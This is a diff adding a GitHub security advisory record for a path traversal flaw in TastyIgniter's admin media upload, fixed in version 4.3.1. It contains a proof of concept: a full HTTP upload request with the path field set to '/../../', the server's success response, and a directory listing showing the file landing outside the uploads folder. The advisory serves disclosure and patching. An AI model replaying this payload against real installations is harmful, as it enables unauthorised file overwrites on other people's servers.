@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-rj59-9f77-mvg5",
+  "modified": "2026-11-25T22:54:30Z",
+  "published": "2026-11-25T22:54:30Z",
+  "aliases": [
+    "CVE-2026-69181"
+  ],
+  "summary": "TastyIgniter permits Path Traversal in Media Upload",
+  "details": "### Summary\nArbitrary file write outside `media/uploads/`\n\n### Details\nIt is possible to perform Path Traversal in Media Manager file upload function as admin.\n\n\n### PoC\n- login as admin\n- upload a image but in the request, change the path from `/` to `/../../`.\n\nRequest\n```http\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 302\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nAccept: application/json\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE\nOrigin: http://localhost:8888\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:8888/admin/media_manager\nAccept-Encoding: gzip, deflate, br\nCookie: laravel_session=eyJpdiI6IkxRY3hrdXkyY01mN3RONXZwNjlDRnc9PSIsInZhbHVlIjoibkZSNHNWWW5hTDZtWXpIbmdnUkM0aFJZZFJRM2V5czVXWUd6TkxwUVFhUUplVGNuY3B5Z1NKZk9TMlc1R1c3akhoakpaUE9MM0ZUcW5tclBtZi80ZXExR3hpUm5hOU40UDl0NWNSWUpNUmNmU043Qmx4aEk4ZWxQQnZUanBPUHoiLCJtYWMiOiI5YmRkMGQ0M2I5M2EzYzRmNGJjOGU5ODhkY2M2MmU1MmI0ODYzYjc5YjQ2OTIzY2Y2NDJiZTRhZDBmOTQyNDUwIiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6InF4RFZUdStuQkY0cGRLU2s4NUFiQ1E9PSIsInZhbHVlIjoiUjMyRUp6UGI3ZFRsL0dhY3pDSUhtMDJaY3Y5bXZ6SFlkQVR5MzZzdGZOT2ZRdExFQ1FJRUh5NDVmQlV0d0tNUXRackcxbTh0YWcxbHphV3dmTVdrNjR5aExhdzZUUFdLQ1JsSEhiMUlZRE1IblBuTFhmdVJWZFc5bFpicU4vS1BUZDh5OGRUMERTU1dsOEdnZVp0bXNpUFI5ZWFPM29RaGl3czU0cnlKczFsN0U4OGFnRWNjREM3aWFSRUtaYTVVTkRmSkV4RXlzZGRiK3RRcGVmOVk2dG1ud0NBaXVFTDRHRVM0Nk9MWDNaUT0iLCJtYWMiOiJiZjA3OGVhMjZlZjQ5ZDczNDkxYmQ3NDBmYWFmNGI5NjNkZDFkMmI0ODAwMTU2MmE5MjMwNjJlMzU0OGM1ODg5IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6Ikt6a2dhWG1oL3p4NFBlOUpUWTNLRGc9PSIsInZhbHVlIjoiaU1KZzErLzJoQ3dsSVRnbkptUE5YcmN6cFk1eVJoNWZlSVZzeFlqcVVlQThDWGc1S2FUS1hGMEFsa1Bsb0RvVE12T1VoTEdKOFpQRm5XMXMrSG1ONTI5T0U2UW5KMFAxRHRTWXA2eFNYSm9xaldlMkZrbHl5aSs3K21hQjBveWEiLCJtYWMiOiI5MzY4NzNhODQ3NjlkNDgzMzc0N2FkZjM0YTJjMDI5MTBhZjc3MmZiNzI2YTc3NTBmNWY2OTFiNTBmMGRlNDg4IiwidGFnIjoiIn0%3D; tastyigniter_session=eyJpdiI6ImpoQldjRHJMTlJCMXlxVWVnbmt4QUE9PSIsInZhbHVlIjoicS9nRENOZDgvRURBL2kvM1VSOTFmaFgzcEtyVVNZK3pMLzBxL2NnU3MwVUIvaW0zMmhacWRvYnMzUzF2NXhDenZ1MFZkK1ErZ0FscGlRUFVpMC80YlBKWHNyVDFCTWR6eFBXYUNTc0VCd3NGR1dxVGRWaWVCOU5QNzZVakpDT28iLCJtYWMiOiI3NGYxMGJkNjcyYWVjMGQ5YjQ2M2M1NjBjZmM0ZGRiM2IzODRjNjM3MmYwMjM3NThmMTM2YjQzYmMzYzExYTQ1IiwidGFnIjoiIn0%3D\nConnection: keep-alive\n\n------WebKitFormBoundaryN13ytndlhtodIsbE\nContent-Disposition: form-data; name=\"path\"\n\n/../../\n------WebKitFormBoundaryN13ytndlhtodIsbE\nContent-Disposition: form-data; name=\"file_data\"; filename=\"test-pic.png\"\nContent-Type: image/png\n\n<sample image>\n------WebKitFormBoundaryN13ytndlhtodIsbE--\n\n``` \n\nResponse\n```http\nHTTP/1.1 200 OK\nDate: Mon, 25 May 2026 16:27:08 GMT\nServer: Apache/2.4.67 (Debian)\nX-Powered-By: PHP/8.3.31\nCache-Control: no-cache, private\nSet-Cookie: XSRF-TOKEN=eyJpdiI6Inp5eVRnNUNmVjlYZXlHNzVsaEZyWVE9PSIsInZhbHVlIjoidTZ4N1djTy9jNEJQdFRzRG1mRkkrYmVKNDMyTE95NytKRWdTU3dwYUNWUUNwaW5USURyS2E1MVNDK0ZHVXJ4ZmdnYWo5R2RUaGZ2TC9SQTVHQUdIK2pKNFZXMmFkNk1GYUdBdkZOc0dNdFYzYVpES0FOSFBjL0s3ZklGNVNIelMiLCJtYWMiOiI0NDI5ZjFjYzZjZjVmZTI1Yjg2OWZmZGUyMjJjMDU1ODVjYTYyNjFjMjMwNGY2YWZmNWIzMjgwOGI5ODMyZGZmIiwidGFnIjoiIn0%3D; expires=Mon, 25 May 2026 18:27:08 GMT; Max-Age=7200; path=/; samesite=lax\nSet-Cookie: tastyigniter_session=eyJpdiI6IjJaT3E2TEVZWHY0UzJLRkVsZVU5ZFE9PSIsInZhbHVlIjoiVi9vcXBOR0xLNUNmcXkrQ04yVitjeENSVC9UN28vSkl3VElTYzFxQkxtYVg5aXBIbmJWRUQxM3BXOXFMSDYxU3g3RVBuSXIxL00xZndyRGg0a01NYVJtQUhHaDJqK0NtSE44VXVrNmVnVWlyM2I3ek1SZFM4T2R0NFhNek5qYm8iLCJtYWMiOiIyODkxN2FlN2Y3YjIyMDA0NGUzZDE4NTdiMWZjMTQzNjc0MWU5NmIzMWIxNDkwYzdjODJjYTE4MWUwM2I4MDQ1IiwidGFnIjoiIn0%3D; expires=Mon, 25 May 2026 18:27:08 GMT; Max-Age=7200; path=/; httponly; samesite=lax\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: application/json\nContent-Length: 104\n\n{\"link\":\"http:\\/\\/localhost:8888\\/storage\\/media\\/uploads\\/\\/..\\/..\\/\\/test-pic.png\",\"result\":\"success\"}\n```\n\nNoticed that the file is uploaded to different directory\n\n```bash\nroot@6108ffece410:/var/www/html# ls -la storage/app/public/\ntotal 20\ndrwxr-xr-x 3 www-data www-data 4096 May 25 16:27 .\ndrwxr-xr-x 4 www-data www-data 4096 May 25 16:10 ..\n-rwxr-xr-x 1 www-data www-data   14 May 25 16:10 .gitignore\ndrwxr-xr-x 4 www-data www-data 4096 May 25 16:15 media\n-rw-r--r-- 1 www-data www-data   14 May 25 16:27 test-pic.png\n```\n\n\n### Impact\nAttacker with admin privilege can write file into other folder which could overwrite other files.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:H/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "tastyigniter/tastyigniter"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.3.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tastyigniter/TastyIgniter/security/advisories/GHSA-rj59-9f77-mvg5"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tastyigniter/core/commit/c6f99d7f47d20c144721c7a1044213f52c9b570f"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tastyigniter/TastyIgniter"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tastyigniter/core/releases/tag/v4.3.1"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-23"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-11-25T22:54:30Z",
+    "nvd_published_at": null
+  }
+}
